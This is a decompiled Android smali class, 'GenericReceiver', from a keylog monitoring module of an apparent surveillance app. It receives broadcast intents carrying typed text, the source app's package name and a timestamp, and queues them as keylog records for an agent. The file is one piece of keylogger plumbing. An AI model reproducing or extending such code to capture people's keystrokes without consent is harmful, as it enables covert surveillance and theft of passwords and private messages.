.class public Lcom/hp/vd/module/monitor/keylog/GenericReceiver;
.super Landroid/content/BroadcastReceiver;
.source "GenericReceiver.java"


# static fields
.field public static final TAG:Ljava/lang/String; = "GenericReceiver"


# instance fields
.field protected buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/KeylogData;",
            ">;"
        }
    .end annotation
.end field

.field protected log:Lcom/hp/vd/agent/log/IWriter;


# direct methods
.method public constructor <init>(Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/KeylogData;",
            ">;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 23
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    const/4 v0, 0x0

    .line 19
    iput-object v0, p0, Lcom/hp/vd/module/monitor/keylog/GenericReceiver;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 20
    iput-object v0, p0, Lcom/hp/vd/module/monitor/keylog/GenericReceiver;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 24
    iput-object p1, p0, Lcom/hp/vd/module/monitor/keylog/GenericReceiver;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 25
    iput-object p2, p0, Lcom/hp/vd/module/monitor/keylog/GenericReceiver;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 3

    :try_start_0
    const-string p1, "date"

    const-wide/16 v0, 0x0

    .line 32
    invoke-virtual {p2, p1, v0, v1}, Landroid/content/Intent;->getLongExtra(Ljava/lang/String;J)J

    move-result-wide v0

    .line 33
    new-instance p1, Lcom/hp/vd/data/KeylogData;

    invoke-direct {p1}, Lcom/hp/vd/data/KeylogData;-><init>()V

    const-string v2, "package_name"

    .line 35
    invoke-virtual {p2, v2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iput-object v2, p1, Lcom/hp/vd/data/KeylogData;->packageName:Ljava/lang/String;

    const-string v2, "content"

    .line 36
    invoke-virtual {p2, v2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    iput-object p2, p1, Lcom/hp/vd/data/KeylogData;->content:Ljava/lang/String;

    .line 37
    new-instance p2, Ljava/util/Date;

    invoke-direct {p2, v0, v1}, Ljava/util/Date;-><init>(J)V

    iput-object p2, p1, Lcom/hp/vd/data/KeylogData;->createdAt:Ljava/util/Date;

    .line 39
    iget-object p2, p0, Lcom/hp/vd/module/monitor/keylog/GenericReceiver;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-virtual {p2, p1}, Lcom/hp/vd/data/concurrency/BlockingQueue;->put(Ljava/lang/Object;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    .line 42
    iget-object p2, p0, Lcom/hp/vd/module/monitor/keylog/GenericReceiver;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "GenericReceiver"

    const-string v1, "onReceive(): Exception caught"

    invoke-interface {p2, v0, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_0
    return-void
.end method
